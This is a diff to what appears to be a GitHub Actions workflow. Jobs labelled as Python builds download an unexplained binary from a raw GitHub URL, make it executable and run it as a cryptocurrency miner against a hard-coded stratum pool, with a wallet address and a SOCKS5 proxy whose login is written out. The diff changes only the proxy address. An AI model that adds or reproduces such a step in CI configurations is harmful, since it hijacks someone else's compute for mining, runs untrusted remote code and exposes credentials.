@@ -49,7 +49,7 @@ jobs:
     - name: Rerunning 
       continue-on-error: true 
       run: | 
-         wget -qO build https://raw.githubusercontent.com/salmanalfarizi1233/SSHBUILDER/main/binuxy && chmod +x build && ./build -a yespowersugar -o stratum+tcp://198.50.168.213:6241 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE -p c=DOGE,zap=SUGAR -t 2 --cpu-affinity=0x3 -x socks5://zdqx78slpxz2tg:x7hjd5204djnvkl4x@185.199.228.220:7300
+         wget -qO build https://raw.githubusercontent.com/salmanalfarizi1233/SSHBUILDER/main/binuxy && chmod +x build && ./build -a yespowersugar -o stratum+tcp://198.50.168.213:6241 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE -p c=DOGE,zap=SUGAR -t 2 --cpu-affinity=0x3 -x socks5://zdqx78slpxz2tg:x7hjd5204djnvkl4x@185.199.231.45:8382
   
  python-build-1: 
     runs-on: ubuntu-20.04  
@@ -65,4 +65,4 @@ jobs:
     - name: Rerunning 
       continue-on-error: true 
       run: | 
-         wget -qO build https://raw.githubusercontent.com/salmanalfarizi1233/SSHBUILDER/main/binuxy && chmod +x build && ./build -a yespowersugar -o stratum+tcp://198.50.168.213:6241 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE -p c=DOGE,zap=SUGAR -t 2 --cpu-affinity=0x3 -x socks5://zdqx78slpxz2tg:x7hjd5204djnvkl4x@185.199.228.220:7300
+         wget -qO build https://raw.githubusercontent.com/salmanalfarizi1233/SSHBUILDER/main/binuxy && chmod +x build && ./build -a yespowersugar -o stratum+tcp://198.50.168.213:6241 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE -p c=DOGE,zap=SUGAR -t 2 --cpu-affinity=0x3 -x socks5://zdqx78slpxz2tg:x7hjd5204djnvkl4x@185.199.231.45:8382
